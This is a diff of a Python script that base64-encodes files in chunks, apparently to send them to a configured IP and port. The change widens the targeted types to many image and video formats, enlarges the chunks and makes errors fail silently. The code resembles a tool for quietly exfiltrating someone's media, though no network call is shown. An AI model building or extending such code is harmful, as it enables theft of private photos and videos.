@@ -7,10 +7,22 @@ import time
 
 
 
-IP = ''
-PORT = 0
+IP = ''  #IP
+PORT = 0 #PORT
 SOC = None
-formats = [".png", ".jpg"]
+formats = [# images
+            ".png", ".apng",
+            ".avif",
+            ".gif", 
+            ".jpg", ".jpeg", ".jfif", ".pjpeg", ".pgp",
+            ".svg",
+            ".webp",
+            ".bmp",
+            ".ico", ".cur",
+            ".tif", ".tiff",
+            # videos
+            ".mp4", ".wmv", ".mov", ".mkv", ".avi"
+            ]
 
 
 def Direc():
@@ -28,18 +40,17 @@ def decodeFile(path):
         with open(path, "rb") as file:
             convert = base64.b64encode(file.read())
         start = 0
-        end = 500
+        end = 4000
         while True:
             data.append(convert[start:end])
             if end >= len(convert):
                 break
-            start += 500
-            end += 500
+            start += 4000
+            end += 4000
         data.append(("\n" + os.path.basename(path)))
         data.append("END123")
         return data
-    except Exception as e:
-        print(e)
+    except:
         return False
 
 
